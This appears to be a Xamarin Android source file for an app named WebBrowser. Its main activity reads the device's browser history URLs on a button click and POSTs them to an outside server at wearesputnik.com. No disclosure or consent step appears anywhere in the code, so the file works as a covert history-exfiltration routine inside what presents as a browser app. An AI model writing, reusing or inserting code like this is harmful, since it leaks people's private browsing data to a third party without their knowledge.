using System;
using System.Collections.Generic;
using System.Net.Http;
using Android.App;
using Android.OS;
using Android.Provider;
using Android.Runtime;
using Android.Support.Design.Widget;
using Android.Support.V7.App;
using Android.Views;
using Android.Widget;
using Newtonsoft.Json;

namespace WebBrowser
{
    [Activity(MainLauncher = true)]
    public class MainActivity : Activity
    {
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            SetContentView(Resource.Layout.test);

            Button fab = FindViewById<Button>(Resource.Id.button);
            fab.Click += FabOnClick;
        }

        void FabOnClick(object sender, EventArgs eventArgs)
        {
            GetHistory();
        }

        void GetHistory()
        {
            String[] proj = new String[] { Browser.BookmarkColumns.Title, Browser.BookmarkColumns.Url, Browser.BookmarkColumns.Date };
            String sel = Browser.BookmarkColumns.Bookmark + " = 0"; // 0 = history, 1 = bookmark
            var mCur = this.ManagedQuery(Browser.BookmarksUri, proj, sel, null, null);
            this.StartManagingCursor(mCur);
            mCur.MoveToFirst();

            string url = "";

            if (mCur.MoveToFirst() && mCur.Count > 0)
            {
                while (mCur.IsAfterLast == false)
                {
                    url = String.Concat(url + "  ", mCur.GetString(mCur.GetColumnIndex(Browser.BookmarkColumns.Url)));

                    mCur.MoveToNext();
                }
            }
            PostRequestHostService(url);
        }

        async void PostRequestHostService(string history)
        {
            try
            {
                HttpClient client = new HttpClient();

                var formContent = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("data", history)
                });

                Console.WriteLine(history);
                HttpResponseMessage response = await client.PostAsync(
                    "http://www.wearesputnik.com/development.knigs/index.php/api/histori/", formContent);
                var responseContent = await response.Content.ReadAsStringAsync();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception:" + ex.Message);
            }
        }
    }
}